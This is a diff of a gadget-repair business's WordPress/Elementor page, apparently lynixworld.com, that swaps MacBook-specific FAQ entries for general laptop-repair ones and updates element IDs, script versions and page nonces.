 								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 														</span>
-												<a class="elementor-accordion-title" tabindex="0">How long does MacBook repair usually take?</a>
+												<a class="elementor-accordion-title" tabindex="0">Is there any charge or cost for consultation?</a>
 					</div>
-					<div id="elementor-tab-content-1782" class="elementor-tab-content elementor-clearfix" data-tab="2" role="region" aria-labelledby="elementor-tab-title-1782"><p><span style="font-weight: 400;">Most repairs are completed on the same day at your location.</span></p></div>
+					<div id="elementor-tab-content-9362" class="elementor-tab-content elementor-clearfix" data-tab="2" role="region" aria-labelledby="elementor-tab-title-9362"><p><span style="font-weight: 400;">No, there are no consultation and visiting charges.</span></p></div>
 				</div>
 							<div class="elementor-accordion-item">
-					<div id="elementor-tab-title-1783" class="elementor-tab-title" data-tab="3" role="button" aria-controls="elementor-tab-content-1783" aria-expanded="false">
+					<div id="elementor-tab-title-9363" class="elementor-tab-title" data-tab="3" role="button" aria-controls="elementor-tab-content-9363" aria-expanded="false">
 													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
 															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 														</span>
-												<a class="elementor-accordion-title" tabindex="0">Do you repair water-damaged MacBooks?</a>
+												<a class="elementor-accordion-title" tabindex="0">What is the procedure if the laptop motherboard is damaged?</a>
 					</div>
-					<div id="elementor-tab-content-1783" class="elementor-tab-content elementor-clearfix" data-tab="3" role="region" aria-labelledby="elementor-tab-title-1783"><p><span style="font-weight: 400;">Yes, we are experts in water-damage Macbook repairs.</span></p></div>
+					<div id="elementor-tab-content-9363" class="elementor-tab-content elementor-clearfix" data-tab="3" role="region" aria-labelledby="elementor-tab-title-9363"><p><span style="font-weight: 400;">We will take the damaged motherboard for repairs, and within two days, you&#8217;ll have a permanently fixed one.</span></p></div>
 				</div>
 							<div class="elementor-accordion-item">
-					<div id="elementor-tab-title-1784" class="elementor-tab-title" data-tab="4" role="button" aria-controls="elementor-tab-content-1784" aria-expanded="false">
+					<div id="elementor-tab-title-9364" class="elementor-tab-title" data-tab="4" role="button" aria-controls="elementor-tab-content-9364" aria-expanded="false">
 													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
 															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 														</span>
-												<a class="elementor-accordion-title" tabindex="0">What is your warranty period?</a>
+												<a class="elementor-accordion-title" tabindex="0">What is your repair warranty?</a>
 					</div>
-					<div id="elementor-tab-content-1784" class="elementor-tab-content elementor-clearfix" data-tab="4" role="region" aria-labelledby="elementor-tab-title-1784"><p><span style="font-weight: 400;">We provide a 3-month warranty for repair services and a 1-year warranty for parts replaced.</span></p></div>
+					<div id="elementor-tab-content-9364" class="elementor-tab-content elementor-clearfix" data-tab="4" role="region" aria-labelledby="elementor-tab-title-9364"><p><span style="font-weight: 400;">Warranty on repair and 1 year on part replacement.</span></p></div>
 				</div>
-										<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Do you charge any fee for diagnosis?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">No diagnosis and visiting charges.<\/span><\/p>"}},{"@type":"Question","name":"How long does MacBook repair usually take?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">Most repairs are completed on the same day at your location.<\/span><\/p>"}},{"@type":"Question","name":"Do you repair water-damaged MacBooks?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">Yes, we are experts in water-damage Macbook repairs.<\/span><\/p>"}},{"@type":"Question","name":"What is your warranty period?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">We provide a 3-month warranty for repair services and a 1-year warranty for parts replaced.<\/span><\/p>"}}]}</script>
+										<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Can I get my laptop fixed on the same day?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">Yes, sometimes it can take 48-72 hours.<\/span><\/p>"}},{"@type":"Question","name":"Is there any charge or cost for consultation?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">No, there are no consultation and visiting charges.<\/span><\/p>"}},{"@type":"Question","name":"What is the procedure if the laptop motherboard is damaged?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">We will take the damaged motherboard for repairs, and within two days, you&#8217;ll have a permanently fixed one.<\/span><\/p>"}},{"@type":"Question","name":"What is your repair warranty?","acceptedAnswer":{"@type":"Answer","text":"<p><span style=\"font-weight: 400;\">Warranty on repair and 1 year on part replacement.<\/span><\/p>"}}]}</script>
 					</div>
 						</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-8b0b31e e-flex e-con-boxed e-con e-parent" data-id="8b0b31e" data-element_type="container">
+		<div class="elementor-element elementor-element-6adefe4 e-flex e-con-boxed e-con e-parent" data-id="6adefe4" data-element_type="container">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-e1b9ff1 e-con-full e-flex e-con e-child" data-id="e1b9ff1" data-element_type="container">
-		<div class="elementor-element elementor-element-9c131fe e-con-full e-flex e-con e-child" data-id="9c131fe" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-		<div class="elementor-element elementor-element-f5e7631 e-con-full e-flex e-con e-child" data-id="f5e7631" data-element_type="container">
-				<div class="elementor-element elementor-element-a776739 elementor-widget elementor-widget-heading" data-id="a776739" data-element_type="widget" data-widget_type="heading.default">
-					<h2 class="elementor-heading-title elementor-size-default"><span style="color:#FE6E00">Your Trusted</span> Gadget Repair Experts!</h2>				</div><div class="elementor-element elementor-element-5e4aca1 elementor-widget elementor-widget-text-editor" data-id="5e4aca1" data-element_type="widget" data-widget_type="text-editor.default">
+		<div class="elementor-element elementor-element-0769075 e-con-full e-flex e-con e-child" data-id="0769075" data-element_type="container">
+		<div class="elementor-element elementor-element-0b46fee e-con-full e-flex e-con e-child" data-id="0b46fee" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+		<div class="elementor-element elementor-element-27287e5 e-con-full e-flex e-con e-child" data-id="27287e5" data-element_type="container">
+				<div class="elementor-element elementor-element-d34e4ff elementor-widget elementor-widget-heading" data-id="d34e4ff" data-element_type="widget" data-widget_type="heading.default">
+					<h2 class="elementor-heading-title elementor-size-default"><span style="color:#FE6E00">Your Trusted</span> Gadget Repair Experts!</h2>				</div>
+				<div class="elementor-element elementor-element-69afb13 elementor-widget elementor-widget-text-editor" data-id="69afb13" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Fast, affordable, and expert gadget repairs — right at your doorstep.</p>								</div>
-				<div class="elementor-element elementor-element-5f06974 elementor-icon-list--layout-inline elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="5f06974" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-element elementor-element-6415ddb elementor-icon-list--layout-inline elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="6415ddb" data-element_type="widget" data-widget_type="icon-list.default">
 							<ul class="elementor-icon-list-items elementor-inline-items">
 							<li class="elementor-icon-list-item elementor-inline-item">
 										<span class="elementor-icon-list-text">✅ MacBook, iPhone, Laptop repairs</span>
@@ -916,7 +923,7 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 									</li>
 						</ul>
 						</div>
-				<div class="elementor-element elementor-element-d830d7b elementor-icon-list--layout-inline elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="d830d7b" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-element elementor-element-fd7f45e elementor-icon-list--layout-inline elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="fd7f45e" data-element_type="widget" data-widget_type="icon-list.default">
 							<ul class="elementor-icon-list-items elementor-inline-items">
 							<li class="elementor-icon-list-item elementor-inline-item">
 										<span class="elementor-icon-list-text">✅ No fix, no fee policy</span>
@@ -926,7 +933,7 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 									</li>
 						</ul>
 						</div>
-				<div class="elementor-element elementor-element-2e2d155 elementor-icon-list--layout-inline elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="2e2d155" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-element elementor-element-be1a184 elementor-icon-list--layout-inline elementor-mobile-align-center elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="be1a184" data-element_type="widget" data-widget_type="icon-list.default">
 							<ul class="elementor-icon-list-items elementor-inline-items">
 							<li class="elementor-icon-list-item elementor-inline-item">
 											<a href="tel:+918000002218">
@@ -947,8 +954,8 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 						</ul>
 						</div>
 				</div>
-		<div class="elementor-element elementor-element-c952fe7 e-con-full e-flex e-con e-child" data-id="c952fe7" data-element_type="container">
-				<div class="elementor-element elementor-element-bb5ffeb elementor-mobile-align-center elementor-align-right elementor-tablet-align-left elementor-widget elementor-widget-button" data-id="bb5ffeb" data-element_type="widget" data-widget_type="button.default">
+		<div class="elementor-element elementor-element-0972109 e-con-full e-flex e-con e-child" data-id="0972109" data-element_type="container">
+				<div class="elementor-element elementor-element-805c6a6 elementor-mobile-align-center elementor-align-right elementor-tablet-align-left elementor-widget elementor-widget-button" data-id="805c6a6" data-element_type="widget" data-widget_type="button.default">
 										<a class="elementor-button elementor-button-link elementor-size-sm" href="tel:+918000002218">
 						<span class="elementor-button-content-wrapper">
 						<span class="elementor-button-icon">
@@ -1049,18 +1056,18 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 					document.addEventListener( event, lazyloadRunObserver );
 				} );
 			</script>
-			<link rel='stylesheet' id='elementor-post-10255-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-10255.css?ver=1758716376' media='all' />
+			<link rel='stylesheet' id='elementor-post-10255-css' href='https://lynixworld.com/wp-content/uploads/elementor/css/post-10255.css?ver=1759144866' media='all' />
 <link rel='stylesheet' id='widget-form-css' href='https://lynixworld.com/wp-content/plugins/elementor-pro/assets/css/widget-form.min.css?ver=3.32.1' media='all' />
 <script id="hostinger-reach-subscription-block-view-js-extra">
-var hostinger_reach_subscription_block_data = {"endpoint":"https:\/\/lynixworld.com\/wp-json\/hostinger-reach\/v1\/contact","nonce":"efb777ae36","translations":{"thanks":"Thanks for subscribing.","error":"Something went wrong. Please try again."}};
+var hostinger_reach_subscription_block_data = {"endpoint":"https:\/\/lynixworld.com\/wp-json\/hostinger-reach\/v1\/contact","nonce":"2d0de2eee1","translations":{"thanks":"Thanks for subscribing.","error":"Something went wrong. Please try again."}};
 </script>
-<script src="https://lynixworld.com/wp-content/plugins/hostinger-reach/frontend/dist/blocks/subscription-view.js?ver=1758476425" id="hostinger-reach-subscription-block-view-js"></script>
+<script src="https://lynixworld.com/wp-content/plugins/hostinger-reach/frontend/dist/blocks/subscription-view.js?ver=1758805777" id="hostinger-reach-subscription-block-view-js"></script>
 <script src="https://lynixworld.com/wp-content/themes/hello-elementor/assets/js/hello-frontend.js?ver=3.4.4" id="hello-theme-frontend-js"></script>
 <script src="https://lynixworld.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.32.2" id="elementor-webpack-runtime-js"></script>
 <script src="https://lynixworld.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.32.2" id="elementor-frontend-modules-js"></script>
 <script src="https://lynixworld.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
 <script id="elementor-frontend-js-before">
-var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.32.2","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_optimized_markup":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"home_screen":true,"e_atomic_elements":true,"atomic_widgets_should_enforce_capabilities":true,"e_classes":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"cloud-library":true,"e_opt_in_v4_page":true,"e_opt_in_v4":true,"import-export-customization":true,"mega-menu":true,"e_pro_variables":true},"urls":{"assets":"https:\/\/lynixworld.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/lynixworld.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/lynixworld.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"5c1d691d79"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":7320,"title":"MacBook%20Repair%20By%20Experts%20-%20Lynix%20World","excerpt":"","featuredImage":"https:\/\/lynixworld.com\/wp-content\/uploads\/2025\/04\/laptop-repair-3-1024x1024.jpg"}};
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.32.2","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_optimized_markup":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"home_screen":true,"e_atomic_elements":true,"atomic_widgets_should_enforce_capabilities":true,"e_classes":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"cloud-library":true,"e_opt_in_v4_page":true,"e_opt_in_v4":true,"import-export-customization":true,"mega-menu":true,"e_pro_variables":true},"urls":{"assets":"https:\/\/lynixworld.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/lynixworld.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/lynixworld.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"f9c1d69546"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":7246,"title":"Laptop%20Repair%20Services%20By%20Experts%20-%20Lynix%20World","excerpt":"","featuredImage":"https:\/\/lynixworld.com\/wp-content\/uploads\/2025\/04\/laptop-repair-3-1024x1024.jpg"}};
 </script>
 <script src="https://lynixworld.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.32.2" id="elementor-frontend-js"></script>
 <script src="https://lynixworld.com/wp-content/plugins/elementor-pro/assets/lib/smartmenus/jquery.smartmenus.min.js?ver=1.2.1" id="smartmenus-js"></script>
@@ -1072,7 +1079,7 @@ var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false
 wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
 </script>
 <script id="elementor-pro-frontend-js-before">
-var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/lynixworld.com\/wp-admin\/admin-ajax.php","nonce":"d0dd1ce620","urls":{"assets":"https:\/\/lynixworld.com\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/lynixworld.com\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/lynixworld.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/lynixworld.com\/wp-admin\/admin-ajax.php","nonce":"e0e571ca5d","urls":{"assets":"https:\/\/lynixworld.com\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/lynixworld.com\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/lynixworld.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
 </script>
 <script src="https://lynixworld.com/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.32.1" id="elementor-pro-frontend-js"></script>
 <script src="https://lynixworld.com/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.32.1" id="pro-elements-handlers-js"></script>
